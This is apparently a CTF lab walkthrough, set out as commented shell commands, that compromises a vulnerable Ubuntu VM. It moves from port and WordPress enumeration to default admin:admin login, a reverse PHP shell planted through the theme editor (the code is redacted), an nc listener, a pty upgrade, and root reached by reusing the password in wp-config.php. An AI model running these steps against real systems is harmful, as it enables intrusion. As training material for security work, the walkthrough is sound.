# There should be three "flags"
# 1) Get a shell
# 2) Get a Root Shell
# 3) There's a post exploit flag

# on boot, we see that the VM has obtained an IP Address from my test
# network's router via DHCP
# IP Address: 192.168.1.186
# Also worth mentioning that it clearly boots into an Ubuntu box, but
# let's not just hung up on that fact.

# Stage 1 - Recon
nmap -T4 -A -v 192.168.1.186

# nmap shows we have a few open ports:
# 22 - SSH
# 53 - DNS
# 80 - HTTP
# 110 - POP3
# 139 - NETBIOS-SSN SAMBA
# 143 - IMAP

# So, after seeing that 80 is open, I went to http://192.168.1.186/
# You get a rather simple webpage, so it's clear that the web-server
# is a part of the enumeration. So, let's find out what pages are available

wfuzz --hc 404 -w /usr/share/wfuzz/wordlist/general/big.txt http://192.168.1.186/FUZZ

# wfuzz didn't show a whole lot:
# index
# upload
# /cgi-bin/

# So, let's run it through dirb and see what we get:

dirb http://192.168.1.186

# dirb was a little more helpful, returning the /wordpress/ directory
# going to http://192.168.1.186/wordpress we get a pretty default WP page,
# so, let's go to http://192.168.1.189/wordpress/wp-admin
# We get a login screen, so, let's go find what users we could use.

wpscan --url http://192.168.1.186/wordpress --enumerate u

# This scan returns the default admin and wpuser account

## PHASE 2 : Enumeration

# Given this, and the fact that we get a default web page, let's try:
# admin : password [FAILS]
# admin : admin [WORKS]

# logging into the wp-admin console with admin:admin, we can drop a reverse
# php shell into the Appearance section of the website ( A lot of the appearance
# section of WP uses PHP, so it makes for a simple copy-paste )

## PHP Shell Redacted ##

# After adding the reverse-php script in, we go to our Kali host

nc -lvp 1337

# and we get a shell.
# let's get an actual shell now:

echo "import pty; pty.spawn('bin/bash')" > /tmp/ctf.py
python /tmp/ctf.py

# now let's get a little more data
whoami
www-data

# okay, let's dig around.
cd /var/www/
ls
cd wordpress
ls
cat wp-config.php

# Here we see that the mysql user is root, and the password is rootpassword!

su root
rootpassword!

# and we're in. 2/3 down, one to go.
locate flag.txt
cat /home/flag.txt
2bafe61f03117ac66a73c3c514de796e
cat /root/flag.txt
8e3f9ec016e3598c5eec11fd3d73f6fb

# with no other users directories / nothing in root / nothing appearing with the
# locate command, we need to start digging a little deeper.
# After some digging I found the flag (finally) in:

cd /etc/cron.d/
cat /php5
